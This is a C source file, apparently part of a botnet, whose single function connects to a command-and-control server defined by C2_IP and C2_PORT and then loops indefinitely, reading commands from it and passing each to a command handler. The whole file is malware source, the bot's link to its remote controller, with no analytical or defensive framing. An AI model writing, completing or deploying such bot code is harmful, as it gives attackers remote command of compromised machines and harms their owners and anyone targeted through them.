#include "../../includes/config/config.h"
#include "../../includes/socket/socket.h"


/*
    *    util/bot/util/socket/socket.c
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


bool connect_server(void) {
    int fd;
    char buffer[255];
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(C2_IP);
    server.sin_port = htons(C2_PORT);

    fd = socket(AF_INET, SOCK_STREAM, 0);

    if (connect(fd, (struct sockaddr *)&server, sizeof(server)) == -1) {
        return false;
    }

    while (1) {
        read(fd, buffer, sizeof(buffer));
        command_handler(buffer);
        memset(buffer, 0, sizeof(buffer));
    }

    close(fd);
    return true;
}